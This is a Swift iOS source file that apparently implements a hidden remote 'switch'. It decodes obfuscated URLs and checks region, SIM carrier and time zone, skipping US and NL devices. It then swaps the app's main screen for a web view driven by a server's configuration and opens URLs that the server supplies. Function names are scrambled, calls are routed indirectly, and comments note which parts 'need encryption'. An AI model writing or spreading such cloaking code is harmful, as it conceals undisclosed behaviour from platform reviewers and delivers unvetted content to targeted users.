
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Ybausuae(_ input: String) -> String? {
    let k: UInt8 = 113
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kNahasuoe = "GQUFAQJLXl4QARhfHAhcGAFfGB5eB0NeGAFfGwIeHw=="         //Ip ur

//https://mock.apipost.net/mock/61ac28e84452000/?apipost_id=1ac29b67b51002
internal let kBzieuewe = "GQUFAQJLXl4cHhIaXxABGAEeAgVfHxQFXhweEhpeR0AQEkNJFElFRURDQUFBXk4QARgBHgIFLhgVTEAQEkNIE0dGE0RAQUFD"

// https://raw.githubusercontent.com/jduja/doorchos/main/icon_trophy.png
// GQUFAQJLXl4DEAZfFhgFGQQTBAIUAxIeHwUUHwVfEh4cXhsVBBsQXhUeHgMSGR4CXhwQGB9eGBIeHy4FAx4BGQhfAR8W
internal let kTayauc = "GQUFAQJLXl4DEAZfFhgFGQQTBAIUAxIeHwUUHwVfEh4cXhsVBBsQXhUeHgMSGR4CXhwQGB9eGBIeHy4FAx4BGQhfAR8W"

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Poamuehs() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UITabBarController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 71 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Kiaosse() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Poamuehs
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func hauebgb(_ dt: Fanskoe) {
    DispatchQueue.main.async {
        let vc = GabzheuViewController()
        vc.znksie = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func namoeujjs(_ param: Fanskoe) {
    let fName = ""

    typealias rushBlitzIusj = (Fanskoe) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : hauebgb
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func oiwoism(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
//        ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cuy as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func spoemja(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : oiwoism
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Dasbui: Decodable {

    let country: Kansuau?
    
    struct Kansuau: Decodable {
        let code: String
    }

}

internal struct Fanskoe: Decodable {
    
    let vbajsi: String?         //key arr
    let azoaie: [String]?            // yeu nan xianzhi
    let znaiso: String?         // shi fou kaiqi
    let nxkade: String?         // jum
    let maoeke: String?          // backcolor
    let wuaaos: String?
    let lsokas: String?   //ad key
    let watysy: String?   // app id
    let lwpoai: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


//func isTm() -> Bool {
//   
//  // 2026-04-08 03:21:43
//  //1775593303
//  let ftTM = 1775593303
//  let ct = Date().timeIntervalSince1970
//  if ftTM - Int(ct) > 0 {
//    return false
//  }
//  return true
//}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Ybausuae("JCI="), Ybausuae("Pz0=")]

// 时区控制
func Kmajnsous() -> Bool {
    
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }
    
    if !Baoiesuue() {
        return false
    }

    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
        return true
    }
    
    return false
}

import CoreTelephony

func Baoiesuue() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}



